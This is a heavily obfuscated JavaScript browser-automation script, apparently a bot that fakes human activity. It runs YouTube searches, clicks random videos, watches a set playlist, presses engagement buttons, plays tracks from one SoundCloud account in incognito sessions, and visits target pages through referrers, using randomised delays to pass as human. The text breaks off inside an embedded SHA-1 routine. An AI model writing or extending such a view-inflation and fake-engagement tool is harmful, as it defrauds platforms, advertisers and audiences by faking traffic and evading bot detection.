const W = c,
  V = b,
  U = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x151 * 0xe + -0x193b * -0x1 + -0x6cc))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x33 * 0x6b + -0x3 * -0xb4e + 0x1269 * -0x3), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x7c7 + -0x83b1 + -0x2015 * -0x8 + (0x150f + 0x297f + -0x3f6) * random()) : await standardWaitForNetIdle(f), await wait(0xcc + 0x1 * -0x1931 + 0x5 * 0x8c9 + (0x15f1 + -0x101a + 0x2139) * random()), 0x1f28 + -0x1f * 0xd1 + -0x1 * 0x5d8;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x3c0 + 0x9 * -0x296 + -0x31 * -0x66);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardWaitForNetIdle(f) {
  return await wait(0x4 * 0x10d + 0x14b9 + -0x565), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0xc * -0x11e + 0x1a69 + 0x8 * -0x1a0;
}
async function randomWait() {
  return await wait(-0x1b88 + -0x116 + 0x3026 + (-0x1bc4 + -0x9fc + -0x2 * -0x1ca4) * random()), 0x4 * 0xca + -0x1 * -0x2486 + -0x27ad;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x989 + 0x2668 + -0x1cdf, -0x43 * -0x32 + -0x13 * 0x204 + 0x193d * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x17 * -0x6ad + 0xff3 * -0x15 + -0x289 * -0xa4) * getRandomInt(-0x1 * 0x2645 + 0x2bf + 0x5ec * 0x6, -0x1 * -0x1e89 + 0xf * -0x291 + -0x2a9 * -0x3), h)), 0x12cd + -0xc1c + 0x6b0 * -0x1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x5d9 * -0x1 + 0xdac + 0x7d3 * -0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xfaa + 0x12d * -0x15 + -0x88 * -0x11]['split']('\x20');
    for (let k = 0x2c3 * -0x2 + -0x5 * -0x5b9 + -0x1717; k < i['length']; k += -0x1 * 0x1954 + 0x105d + 0x8f9)
      j += i[k] * h[i[k + (0x191a + 0x36c + -0x1c85)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x3c0 + 0x9 * -0x296 + -0x31 * -0x66);
    let h = e[f];
    if (c['dwLUus'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x5ba * 0x5 + 0x1206 + 0xa9c, r, s, t = -0x1 * 0x1afd + -0x137e + 0x2e7b; s = m['charAt'](t++); ~s && (r = q % (0x193b + -0x2703 * -0x1 + -0x403a) ? r * (0x33 * 0x6b + -0x3 * -0xb4e + 0xaff * -0x5) + s : s, q++ % (-0x14c + -0x15f3 + -0x7c1 * -0x3)) ? o += String['fromCharCode'](0x705 + 0xdd5 + -0x13db & r >> (-(0xcc + 0x1 * -0x1931 + 0x1 * 0x1867) * q & 0xaf9 + -0x80d + -0x2e6)) : 0x1f28 + -0x1f * 0xd1 + -0x1 * 0x5d9) {
          s = n['indexOf'](s);
        }
        for (let u = 0x4 * 0x10d + 0x14b9 + -0x18ed, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xc * -0x11e + 0x1a69 + 0x1 * -0xcf1))['slice'](-(-0x1b88 + -0x116 + 0x1ca0));
        }
        return decodeURIComponent(p);
      };
      c['FeXQvD'] = i, b = arguments, c['dwLUus'] = !![];
    }
    const j = e[-0x1bc4 + -0x9fc + -0x1 * -0x25c0],
      k = f + j,
      l = b[k];
    return !l ? (h = c['FeXQvD'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1d85 + 0x1 * -0x671 + 0x23fc)['map'](l => Array['from'](l['children']))['flat'](-0xd * -0x2ff + -0x19a7 + 0x1 * -0xd4b)['map'](l => l['childNodes'][0x1845 * 0x1 + 0x3 * -0xbd5 + 0xb3b]['childNodes'][0x555 + -0x226f + 0x1d1a]['childNodes'][-0x1781 + -0x258f * 0x1 + -0x1b * -0x243]['childNodes'][0x737 * 0x1 + 0x2 * -0x904 + -0x47 * -0x27]['childNodes'][-0x3b9 + -0x943 * -0x1 + -0x1 * 0x589]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x6ee + 0x1056 + -0x135c, 0x1416 * 0x1 + 0x763 * -0x2 + -0x208 * -0x7)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x5b35 + 0x16a2 + 0x7f2b);
  const h = await getMaxTime(f),
    i = Math['min']((0x1c73f + 0x3d * -0xf7 + -0x1 * 0xa204) * getRandomInt(-0x3b3 * -0x1 + 0x1152 + -0x1503, -0x1 * 0x7f9 + -0xd3 * 0x6 + 0xcf0), h);
  return await wait(i), -0xfb1 + -0x1 * 0x1489 + 0x243b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1 * -0x4a5 + 0xff1 + -0x1496]['children'][-0x1 * 0x1059 + -0x1cc1 + 0x2d1a]['children'][0x15ff + 0x16ac * -0x1 + 0xad]['children'][-0x1ae4 + -0x4a + -0x3e2 * -0x7]['children'][-0x1c4c + 0x1a2a + 0x2 * 0x111]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x8d * 0x12 + 0x3d9 * -0x1 + -0x2 * 0x308;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x2 * 0x1cc + 0x1 * -0x20ac + -0x3af * -0x8 + (0x1b83 + 0x15b1 + -0x3102) * random()
  }), await wait(-0x8b * -0x3d + 0x6a6 * -0x3 + 0xd * -0xdd + (-0x39b * -0x7 + -0xd13 + -0xafe) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x19c1 * -0x1 + 0x26ba + -0xce5 * 0x5]['childNodes'][-0x3cb * -0x3 + -0x29 * 0x89 + 0xa91 * 0x1]['childNodes'][-0xe73 + 0x1 * -0x1dc5 + 0x2c39]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x17 * -0x5b + 0x1386 + -0x1bae]['childNodes'][0xa * 0x31d + 0x1e73 + -0x3d95]['childNodes'][0x66 * 0x19 + 0x1 * 0xd56 + -0xb * 0x21e]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x35 * -0x2 + -0x8e * 0x1f + 0x10c9 * 0x1),
          r = -0x973 * -0x3 + -0x2498 + 0x83f;
        for (let u = -0x4 * 0x67 + 0xc08 + 0x536 * -0x2; u < q['length']; u += -0x17af + -0x2 * -0xcfa + -0x243)
          r += q[u] * k[q[u + (0x1d17 * 0x1 + -0xc5f + -0x10b7)]];
        return r;
      }(n);
  });
  await wait((0x37cf + -0x9 * 0x29a + 0x1a33) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x83a1 + 0xb5 * 0x8b + 0x85dd * 0x2) * getRandomInt(-0x1edd + 0x274 + -0x2 * -0xe35, 0xc89 * -0x1 + -0xec1 + 0x27c * 0xb), h + (-0x1c81 + 0x1 * 0x1543 + 0x1 * 0x1ac6));
  return await wait(i), -0x3c2 * 0x6 + -0x659 + 0x9 * 0x336;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1046 + 0x1044 + 0x31 * -0xaa), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2cf + -0x12dc + -0xe7 * -0x25 + (-0x7f5 + -0x160e + 0x21eb) * Math['random']());
    });
  }, 0x73a + 0x15dc + -0x1be);
  await wait(-0x102f * 0x79 + -0x2cc8 * 0xc + 0xe5377);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xe9 * 0x1ba + 0x10890 + -0x1b07a) * getRandomInt(0x2015 * -0x1 + -0x1166 * -0x1 + 0xeb3, -0x2 * -0x3d1 + 0x23d6 * -0x1 + -0x5 * -0x5a9)), clearInterval(h), 0x25c1 + -0x11c5 * 0x1 + 0x21 * -0x9b;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x371 + -0x137f + -0x8 * -0x2de;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x155a * -0x1 + 0x1 * 0x14ce + -0x2a27;
    await randomWait();
  }
  return -0x3a4 * -0x4 + -0x357 * -0x7 + -0x10 * 0x25f;
}

function fetchRandomSC() {
  const R = b;
  return Math['random']() <= -0x1 * 0x17ed + 0x1 * 0xce9 + 0xb04 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1527 + -0x4e2 * -0x1 + 0x253 * 0x7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + R(0xa, 'lMD#') + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1 * 0x1d82 + 0x2 * -0x848 + -0xcf2 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x18d * -0xd + 0x1c8a * 0x1 + -0x861;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x7 * -0x30 + 0xf9c0 + 0x108 * -0x49 + getRandomInt(-0x327 * -0x15 + -0x6b85 + 0x63ea, -0x19b * -0x25 + 0x1c * 0x577 + -0x5f3b));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x207e + 0xc * -0x281 + -0x271), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1 * 0xfc7 + 0x2 * -0x7cd + 0x1f61;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x4e * -0x5d + -0x1a72 + 0x36c8, -0x1 * -0x1b28 + 0x2 * 0xd7 + -0x1ca4)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1ad * 0x10 + -0x18 * 0x5d + -0x524 * 0x2 + floor((0x279 + 0x3 * 0xb33 + -0x202a) * random()))), log('p2'), log(await s['evaluate'](() => {
        const S = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x1 * -0xc51be036 + -0x9d60c93c + -0xf2 * -0x1fe6641),
          -0xb270c1 + -0x61db56 + 0x1944c17,
          -0x2f21 * -0x1 + -0x1 * 0x8cdb + -0x1 * -0xddba,
          0x15 * -0x7b + -0x225 + 0xcbc
        ], y = [
          -0x1 * 0x272 + -0x8a8 + 0xb32,
          -0x1236 + 0xf61 * 0x1 + 0x2e5,
          0x21d6 + 0x19 * -0x112 + -0x70c,
          -0x1f * 0x3d + 0x1285 * -0x2 + 0x2c6d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x5b + -0x221b * 0x1 + 0x21c1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x7 * 0x10d + -0xcaa + 0x54f; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x4a * -0x17 + 0x1f5d + 0x25 * -0xab) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x111a + -0x18e + -0xf8c] = A[-0x1790 * 0x1 + 0x6cc + 0x86a * 0x2] = A[0x212d + -0x1a80 + -0x6ac] = A[0x728 + -0x6f * 0x17 + 0x2d3] = A[-0x1 * 0x13bb + 0x3 * -0xbd7 + -0x149 * -0x2b] = A[-0x1 * -0x1ea1 + -0x4cf * 0x8 + 0x7db] = A[0xe71 + 0x5f * 0x3d + -0x250f] = A[-0x2 * 0x128b + -0xdc * 0x1 + 0x25f8] = A[-0x1f * -0xab + -0x23 * -0xf4 + 0x1 * -0x360a] = A[0x1f * 0x41 + 0x217c + -0x2953] = A[-0x21 * -0xfe + -0x6da + -0x19db] = A[0x27d * -0x7 + 0xbbe + -0x7 * -0xd1] = A[0x1503 + -0x998 * 0x2 + -0x1c8] = A[0x714 + -0x236f + 0x1c67] = A[0xdd8 + 0x1913 + -0x26de] = A[0x23d5 + -0x1627 * -0x1 + -0x39ee * 0x1] = A[-0xf8a + -0x1820 + 0x27b9 * 0x1] = 0x14b * -0x19 + -0x219e + 0x15fb * 0x3, this['blocks'] = A) : this['blocks'] = [
                -0x2 * -0x11bd + -0x1 * 0x246f + 0x23 * 0x7,
                -0x1655 + -0x2085 + 0x36da,
                0x226a + 0xaab * -0x1 + -0x17bf,
                -0x18ab + 0x1344 + 0x567,
                0x53 * -0x13 + 0x757 * -0x3 + -0xe17 * -0x2,
                0x391 + -0x5 * -0x29 + -0x45e,
                0x2448 + 0x4 * -0x123 + -0x1fbc,
                0xc99 + -0x1 * 0x473 + 0x7 * -0x12a,
                -0x25fb + -0x6e5 * 0x2 + 0x33c5,
                -0x1 * -0x1e01 + 0xc03 + -0x1 * 0x2a04,
                0x1da7 + -0x18ed + -0x4ba,
                -0x23f3 + 0x821 * 0x1 + 0x1bd2,
                -0x937 + -0x1fb8 + 0x1f3 * 0x15,
                -0x26a8 * 0x1 + 0x10af * 0x1 + 0x15f9,
                0x44 * -0x7c + 0xaba + -0x1 * -0x1636,
                -0x1e2f * 0x1 + -0x2680 + 0x44af,
                -0x3 * -0x3df + -0x162a + -0x25 * -0x49
              ], this['h0'] = 0x11e7 * 0x5a73f + -0x1 * 0xc88e2b15 + 0x3 * 0x438a11bf, this['h1'] = -0xbd2a8bd6 + 0x157a33c17 + 0x54aba4 * 0x102, this['h2'] = 0x17a0533b + 0x212100fd + 0x5ff988c6, this['h3'] = -0x1186cf38 + 0x4168c1b + 0x1da29793, this['h4'] = 0x8 * -0x24cdf496 + 0x426 * 0x5709fb + 0x812f1f5e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x12da + 0xde * -0x2 + 0x1496, this['finalized'] = this['hashed'] = -0x1c5 * -0x9 + 0xf * 0x143 + -0x22da, this['first'] = -0x2 * 0x76f + 0x5 * 0x56 + 0xd31;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * -0x167 + -0x113 * 0x2 + -0x12f * -0x3, O = J['length'] || -0x2 * 0x98e + 0xa6 + 0x8b * 0x22, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x3 * 0xb8d + -0x1 * 0x16cf + -0x5 * -0xb7e, P[0x1c14 + -0x359 * 0xb + -0x1 * -0x8bf] = this['block'], P[-0xf13 + 0x20fd + -0x11da] = P[0x2f6 * 0x8 + 0x1740 + -0x2eef] = P[0x12f0 + 0x133e + -0x2 * 0x1316] = P[0x914 + -0x32 * 0xc7 + 0x1dcd] = P[0x9d * -0x3d + 0x66 * 0x1c + 0x1a45] = P[-0x7 * 0x3d6 + 0x1b0f + -0x30] = P[0x22e0 + 0x1d9b + 0x1 * -0x4075] = P[0x155d + -0x417 * -0x5 + -0x29c9] = P[-0x7 * 0x371 + 0x12c3 * 0x2 + 0x1 * -0xd67] = P[-0x1 * 0x2565 + -0x13 * 0x1cc + 0x2 * 0x23c9] = P[0x1b6 * 0x3 + 0xfd7 * 0x2 + -0x12 * 0x20b] = P[0x2144 + -0x507 * -0x3 + -0x304e] = P[0x19 * 0x91 + 0x178 * 0x2 + -0x110d] = P[-0x34 * 0x4 + -0x228b + 0x2368] = P[-0x9af * -0x3 + 0x265b + -0x1d2 * 0x25] = P[0x13a * 0x1b + -0x205b + -0xb4] = 0x1f3d + 0xef * 0x27 + -0x43a6), K) {
                    for (N = this['start']; M < O && N < -0x24b1 + 0x1 * 0x4e7 + -0x1 * -0x200a; ++M)
                      P[N >> 0x1 * 0x1efe + 0xfa4 + 0x2 * -0x1750] |= J[M] << y[0x1 * -0xdf3 + -0xa98 + -0xc47 * -0x2 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x17 * -0x1b2 + -0x1630 + -0x1 * -0x3d6e; ++M)
                      (L = J['charCodeAt'](M)) < 0x99d * 0x1 + -0x13c5 + 0x1 * 0xaa8 ? P[N >> -0x3ec + 0x1764 + -0x1376] |= L << y[-0x1a * -0x16f + 0x1b * 0x8f + -0xa78 * 0x5 & N++] : L < 0x29 * 0x8a + -0x10ea + -0xc * -0x3c ? (P[N >> -0x20a9 + -0x1d * 0x2 + 0x20e5] |= (0x80d * -0x1 + -0x19 * -0xf9 + -0xf84 | L >> -0xae * 0x19 + -0x15b2 + 0x26b6) << y[0x1501 + -0x1 * -0x88 + -0x1586 & N++], P[N >> -0x1 * -0x208c + 0xcc8 + -0x2d52] |= (-0x2677 + 0x113 * -0x1 + 0x280a | 0x2 * -0x2c + 0x1050 + -0xfb9 & L) << y[-0x17 * 0x160 + 0x21c8 + -0x225 & N++]) : L < -0x4b26 + -0xcf90 + -0x1 * -0x1f2b6 || L >= -0x2 * -0x421c + -0x1 * 0x6eef + 0xcab7 ? (P[N >> -0x18fa + -0xbb5 + 0x24b1] |= (-0x1a88 + -0x82d + -0x1 * -0x2395 | L >> -0x1915 * -0x1 + -0x770 + 0x35 * -0x55) << y[-0x2 * -0x79a + 0x2 * 0x38d + 0xd * -0x1b7 & N++], P[N >> -0x20 * 0x9d + -0x2d * 0x93 + -0x67f * -0x7] |= (0x8 * 0x454 + 0x10ad * 0x1 + -0x32cd | L >> -0xc35 + -0x1773 + -0x1 * -0x23ae & 0x2347 + 0x1f24 + 0x134 * -0x37) << y[0x41d + -0x57 * -0x32 + 0x28 * -0x87 & N++], P[N >> -0xa9 * -0x3 + -0x1b37 + 0x193e] |= (0x28d * 0xf + 0x1d35 * -0x1 + -0x88e | -0x23c9 + 0x1 * 0x1336 + 0x10d2 & L) << y[0x5cf + -0x3 * -0x24d + -0xcb3 & N++]) : (L = -0x14cdd + 0xc95b + 0x18382 + ((-0xf23 + 0x186e + -0x54c & L) << 0x1d8b + -0x268c + 0x90b | -0x1 * 0x1c1d + -0x1 * 0x8bf + -0x28db * -0x1 & J['charCodeAt'](++M)), P[N >> 0x5be + 0x980 + 0x104 * -0xf] |= (0xe57 * 0x1 + 0xbd6 + -0xd * 0x1f1 | L >> 0xb3f + -0x1 * 0x185f + 0x2 * 0x699) << y[0x232d + 0xf4e + -0x3278 * 0x1 & N++], P[N >> -0x157e + 0x208d * 0x1 + 0x3 * -0x3af] |= (-0x2204 * -0x1 + 0x1817 + 0x399b * -0x1 | L >> 0x359 * -0x3 + -0x1818 + 0x3 * 0xb65 & 0x2675 + -0x24b0 + 0x2 * -0xc3) << y[-0x2137 + -0x1e0d + 0x3f47 & N++], P[N >> -0x158 * -0x5 + -0xa8c + -0x1 * -0x3d6] |= (-0x1 * 0xc74 + 0x1eaa + -0x11b6 | L >> 0x41 * -0x25 + -0x6 * -0x2b + 0x869 & -0x2f * -0xb1 + -0x2183 * -0x1 + -0x41c3) << y[-0x26c7 + 0x5 * 0x4a + 0x2558 & N++], P[N >> 0x263d + -0x1478 + -0x11c3 * 0x1] |= (0x1445 * 0x1 + -0x2043 * 0x1 + 0xc7e | -0x1489 * 0x1 + 0x18e0 + -0x418 & L) << y[0x15f3 * 0x1 + 0x1 * 0x269 + -0x1859 * 0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0xfd4 + -0x4a * -0x39 + 0x1 * -0x200e ? (this['block'] = P[0x1 * -0x2467 + 0x173e + 0x1 * 0xd39], this['start'] = N - (0x716 + 0x1067 + 0x7bf * -0x3), this['hash'](), this['hashed'] = -0x2b4 * -0xe + -0x295 * -0x8 + -0x1 * 0x3a7f) : this['start'] = N;
                }
                return this['bytes'] > 0x1292ad217 + 0x122af37cb + -0x14bda09e3 && (this['hBytes'] += this['bytes'] / (0x9604 * -0x24f7d + 0x1 * -0x560af448 + 0x2b0a7703c) << -0x17a3 + -0x5ce * 0x6 + -0x3a77 * -0x1, this['bytes'] = this['bytes'] % (-0x137a84aac + -0x5 * 0x586182f8 + 0x3f18fd984)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1 * -0xff9 + 0x1dcb + -0x1b * 0x83;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x890 * -0x4 + 0x1 * -0x1f4b + -0x27 * 0x13] = this['block'], J[K >> -0x82f * 0x3 + 0x3a * -0x42 + 0x2783] |= x[-0xb2 * 0xb + -0xf02 + 0x1 * 0x16ab & K], this['block'] = J[-0x2293 + -0x26 * -0xea + 0x19 * -0x1], K >= -0xc + 0x15 * -0x31 + 0x449 && (this['hashed'] || this['hash'](), J[0xbfc + 0xfde + -0x1bda] = this['block'], J[0x1a1e * 0x1 + 0x26cf * 0x1 + -0x40dd] = J[-0x1af * 0xd + 0x2f * -0xca + 0x3afa * 0x1] = J[0x966 * -0x4 + 0x1 * 0x2029 + 0xc7 * 0x7] = J[0x10e8 * 0x1 + -0x212 * -0x8 + 0x6b1 * -0x5] = J[0x24c1 + 0x3fc + -0x1 * 0x28b9] = J[-0x34 * -0x8a + 0x1 * 0x229f + 0x1 * -0x3ea2] = J[-0x2501 + -0x2234 + 0x473b] = J[0x475 + -0x1bf8 + 0x178a] = J[0x27e + -0x6ee + -0x16 * -0x34] = J[0x1a24 + 0x8ab + -0x22c6] = J[-0xa * 0x161 + -0x1620 + 0x23f4] = J[0x1 * 0xb3b + 0x1a60 * 0x1 + -0x10 * 0x259] = J[0x4 * 0x84a + -0x1 * -0x4b1 + -0x25cd] = J[0x2d7 * -0x3 + -0x5fb + 0xe8d * 0x1] = J[-0x191 * 0x12 + 0x1 * 0x28d + 0x1 * 0x19b3] = J[0x2213 + -0x186b + -0x1 * 0x999] = -0x31 * -0xc7 + -0x1 * 0x1c3a + -0x9dd), J[-0x2 * -0xbb8 + 0xb99 * -0x3 + -0x7f * -0x17] = this['hBytes'] << -0xfc4 + 0x9 * 0x443 + -0x1694 | this['bytes'] >>> -0x106 * -0x12 + -0x480 + -0x65 * 0x23, J[0x13 * -0x1af + 0x1 * -0x29d + 0x22a9] = 